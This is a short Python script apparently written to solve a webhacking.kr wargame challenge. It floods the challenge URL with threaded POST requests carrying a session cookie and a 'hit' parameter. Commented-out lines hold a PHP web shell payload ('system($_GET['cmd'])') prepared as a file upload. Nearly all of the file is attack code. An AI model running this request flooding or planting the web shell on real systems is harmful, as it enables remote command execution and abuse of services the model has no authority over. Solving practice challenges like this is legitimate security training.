import requests
import concurrent.futures


URL = "https://webhacking.kr/challenge/code-5/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}

params ={"hit":"EliCopter770"}
# answer=""
# for i in range(97,123,2):
#     answer +=chr(i)
# print(answer)
# params = {"ans":answer}
# files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
def send_point():
    response = requests.post(URL,params=params, cookies=cookies)
    print(response.text)

num_threads = 10
for i in range(50):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_point ) for _ in range(num_threads)]
        try:
            for future in concurrent.futures.as_completed(futures):
                # This line will only be reached if any thread finishes (unlikely in this setup)
                future.result()
        except KeyboardInterrupt:
            print("Stopping threads...")